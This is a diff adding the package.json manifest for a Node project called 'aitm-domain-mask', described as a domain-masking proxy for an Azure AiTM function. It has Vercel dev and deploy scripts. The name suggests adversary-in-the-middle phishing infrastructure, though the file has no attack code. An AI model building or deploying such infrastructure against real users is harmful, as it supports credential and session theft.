@@ -1,0 +1,15 @@
+{
+  "name": "aitm-domain-mask",
+  "version": "1.0.0",
+  "description": "Domain masking proxy for Azure AiTM Function",
+  "main": "api/proxy.js",
+  "scripts": {
+    "dev": "vercel dev",
+    "deploy": "vercel --prod"
+  },
+  "dependencies": {},
+  "devDependencies": {},
+  "engines": {
+    "node": ">=18.0.0"
+  }
+}
